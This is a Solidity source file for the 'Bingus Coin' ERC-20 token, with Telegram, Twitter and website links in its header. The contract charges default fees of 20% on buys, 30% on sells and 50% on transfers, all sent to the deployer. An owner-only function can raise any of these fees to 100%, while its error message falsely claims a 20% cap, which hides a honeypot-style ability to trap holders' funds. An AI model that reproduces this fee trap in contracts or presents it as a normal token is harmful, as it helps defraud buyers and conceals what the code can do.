/*
    SPDX-License-Identifier: None
    Bingus Coin

    Telegram: https://t.me/TheBingusCoin
    Twitter: https://twitter.com/Thebinguscoin
    Website: thebinguscoin.com

*/

pragma solidity ^0.8.19;


interface IERC20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */

    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakePair {
    function sync() external;
}

interface IDEXRouter {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Bingus is IERC20, Ownable {
    using SafeMath for uint256;

    address constant ROUTER        = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH          = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO          = 0x0000000000000000000000000000000000000000;

    string _name = "Bingus Coin";
    string _symbol = "BINGUS";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000 * (10 ** _decimals);
    uint256 public _maxWalletToken = (_totalSupply * 100) / 10000;   // 1% 

    /* rOwned = ratio of tokens owned relative to circulating supply (NOT total supply, since circulating <= total) */
    mapping (address => uint256) public _rOwned;
    uint256 public _totalProportion = _totalSupply;

    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
 
    uint256 liquidityFee = 0; 
    uint256 giveawayFee = 0;  
    uint256 marketingFee = 0;   
    uint256 reflectionFee = 0; 
    uint256 totalFee = 0;  

    uint256 buyFee = 20; 
    uint256 sellFee = 30; 
    uint256 transferFee = 50; 
    uint256 feeDenominator = 100; 
    
    address autoLiquidityReceiver;
    address marketingFeeReceiver;

    IDEXRouter public router;
    address public pair;

    bool public claimingFees = true;
    uint256 public swapThreshold = _totalSupply.mul(1).div(100);
    bool anticlearOn = true;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {

        address deployer = msg.sender;
        router = IDEXRouter(ROUTER);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[address(this)] = true;
        isFeeExempt[deployer] = true;

        autoLiquidityReceiver = deployer;
        marketingFeeReceiver = deployer;

        _rOwned[deployer] = _totalSupply;
        emit Transfer(address(0), deployer, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function name() external view returns (string memory) { return _name; }
    function changeName(string memory newName) external onlyOwner { _name = newName; }
    function changeSymbol(string memory newSymbol) external onlyOwner { _symbol = newSymbol; }
    function symbol() external view returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (recipient != pair && recipient != DEAD && !isFeeExempt[recipient] && !isFeeExempt[sender]) {
            require(balanceOf(recipient) + amount <= _maxWalletToken, "Max Wallet Exceeded");
        }

        if(shouldSwapBack()){ swapBack(amount); }

        uint256 proportionAmount = tokensToProportion(amount);

        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");

        uint256 proportionReceived = shouldTakeFee(sender, recipient) ? takeFeeInProportions(sender, recipient, proportionAmount) : proportionAmount;
        _rOwned[recipient] = _rOwned[recipient].add(proportionReceived);

        emit Transfer(sender, recipient, tokenFromReflection(proportionReceived));
        return true;
    }

    function tokensToProportion(uint256 tokens) public view returns (uint256) {
        return tokens.mul(_totalProportion).div(_totalSupply);
    }

    function tokenFromReflection(uint256 proportion) public view returns (uint256) {
        return proportion.mul(_totalSupply).div(_totalProportion);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 proportionAmount = tokensToProportion(amount);
        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, "Insufficient Balance");
        _rOwned[recipient] = _rOwned[recipient].add(proportionAmount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) public view returns (uint256) { 
        if (sender   == pair) { return buyFee; } 
        if (recipient == pair) { return sellFee; } 
        return transferFee;
    }

    function takeFeeInProportions(address sender, address recipient, uint256 proportionAmount) internal returns (uint256) {
        uint256 proportionFeeAmount = proportionAmount.mul(getTotalFee(sender,recipient)).div(feeDenominator);
        uint256 proportionReflected = 0;

        // reflect
        if (totalFee > 0) {
            proportionReflected = proportionFeeAmount.mul(reflectionFee).div(totalFee);
            _totalProportion = _totalProportion.sub(proportionReflected);
            emit Reflect(proportionReflected, _totalProportion);
        }

        // take fees
        uint256 _proportionToContract = proportionFeeAmount.sub(proportionReflected);
        _rOwned[address(this)] = _rOwned[address(this)].add(_proportionToContract);

        emit Transfer(sender, address(this), tokenFromReflection(_proportionToContract));
        return proportionAmount.sub(proportionFeeAmount);
    }

    function clearBalance() external {
        (bool success,) = payable(autoLiquidityReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && claimingFees
        && balanceOf(address(this)) >= swapThreshold;
    }

    function swapBack(uint256 originaltxAmount) internal swapping {

        // uint256 _totalFee = totalFee.sub(reflectionFee);
        uint256 amountToSwap = swapThreshold;
        if (anticlearOn && originaltxAmount < swapThreshold) {
            amountToSwap = originaltxAmount.mul(2) > swapThreshold ? swapThreshold : originaltxAmount.mul(2);
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        // uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        // uint256 amountETH = address(this).balance.sub(balanceBefore);

        (bool success,) = payable(marketingFeeReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success, "receiver rejected ETH transfer");
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount, bool _anticlearOn) external onlyOwner {
        claimingFees = _enabled;
        swapThreshold = _amount;
        anticlearOn = _anticlearOn;
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _reflection, uint256 _total, uint256 _buy, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; reflectionFee = _reflection; totalFee = _total; buyFee = _buy; sellFee = _sell; transferFee = _trans;
        require(totalFee <= feeDenominator && sellFee <= feeDenominator && transferFee <= feeDenominator, "totalFee and sellFee cannot be more than 20%");
    }

    function removeLimits() public onlyOwner {
        _maxWalletToken = _totalSupply;
    }
    
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setFeeReceivers(address _marketingFeeReceiver, address _liquidityFeeReceiver) external onlyOwner {
        marketingFeeReceiver = _marketingFeeReceiver;
        autoLiquidityReceiver = _liquidityFeeReceiver;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    event Reflect(uint256 amountReflected, uint256 newTotalProportion);
}